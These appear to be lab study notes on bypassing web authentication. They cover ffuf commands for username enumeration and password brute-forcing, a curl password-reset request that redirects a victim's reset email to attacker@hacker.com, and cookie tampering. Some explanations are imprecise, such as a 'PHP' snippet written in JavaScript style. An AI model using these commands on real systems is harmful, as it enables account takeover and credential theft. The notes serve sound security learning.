Authentication Bypass: 
    * The ways in which website authentication can by broken, defeated or bypassed. Often leads to sensitive leaks.
        
    Username Enumeration:
        * Website input field errors are helpful in identifying valid usernames (e.g admin)
        * If ('An account already exists with that username...') {username valid}
        * Using ffuf: (https://github.com/ffuf/ffuf)
            ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.44.0/customers/signup -mr "username already exists"
            * -w flag defines the wordlist. -x defines the request method (POST). -d specifies the data being sent (username, email, password, cpassword).
            * FUZZ signifies where wordlist is inserted in request. -u specifies the target website. 
            * -mr is the text we are looking for to validate username existence. "a username already..."
    
    Bruteforce: (ffuf)  
        * ffuf can be used to bruteforce passwords given username(s).
        ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.44.0/customers/login -fc 200
            * Unlike previous, we have to specify our own FUZZ keyword.
            * w1 is list of valid usernames. w2 is list of passwords. -w denotes multiple wordlists, separated with commas.
            * -fc checks for a certain HTTP status code, in this case != 200 means valid
    
    Logic Flaws:
        * When the typical path of auth can be bypassed, circumvented or manipulated.
        PHP example:
        {
            if( url.substr(0,6) === '/admin') {
                # Code to check user is an admin
            } else {
                # View Page
            }
        * Above is looking for an exact match (===)
        * This means that unauthorized user requesting /adMin is not checked for privileges

        Using curl to make manual request:
            curl 'http://10.10.44.0/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
            curl 'http://10.10.44.0/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
            * By specifying POST we can control where the email is sent to.
            * This is a logical flaw, POST is favoured.
        }

    Cookie Manipulation: 
        Plaintext:
        * Doing this can net results such as unauthenticated access, access to another user's account, or elevated privileges.
        * Some cookies are plaintext and obvious:
            Set-Cookie: logged_in=true; Max-Age=3600; Path=/
            Set-Cookie: admin=false; Max-Age=3600; Path=/
        * logged_in controls whether user is logged in, admin controls privileges
        * Hence, by changing cookies we may be able to escalate privileges.
            curl http://10.10.44.0/cookie-test                                              ---> 'Not Logged in'
            curl -H "Cookie: logged_in=true; admin=false" http://10.10.44.0/cookie-test     ---> 'Logged in as user'
                * By including logged_in=true as a header, we can bypass auth.

    Hashed Cookies:
        * Even though hashing is irreversible, it is predictable given string s.
        * https://crackstation.net/ is a database with millions of hashes and their strings.
    
    Encoding:
        * Differs from hashing because it IS reversible.
        * Why? Converts binary -> readable text so that it can transfer over plain text ASCII channels.
        * Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.
        * 